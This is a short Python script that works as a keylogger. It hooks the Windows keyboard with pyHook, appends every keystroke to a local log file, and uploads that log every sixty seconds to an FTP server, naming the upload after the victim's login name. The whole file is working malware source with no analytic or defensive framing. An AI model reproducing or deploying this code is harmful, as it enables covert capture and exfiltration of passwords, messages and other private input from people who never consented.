import pyHook
import pythoncom
import threading
from network.ftpconn import upload_to_ftp
import os

G_File = open('log.txt','a')
G_File.close()

MACHINE_NAME = os.getenv('username')

filename = MACHINE_NAME + '_log.txt'

print("Got file name")
def log_to_ftp():
    global filename
    upload_to_ftp('log.txt',filename,'rb')
    threading.Timer(60,log_to_ftp).start()


def OnKeyboardEvent(event):
    print("Got event")
    try:
        File = open('log.txt','a')
        File.write(chr(event.Ascii))
        File.close()
    except:
        print("Error reading ascii encodes")
    return True

def gethookready():
    hooks_manager = pyHook.HookManager ( )
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard( )
    print("111done....")
    pythoncom.PumpMessages()
    print("done....")

threading.Timer(1,gethookready).start()
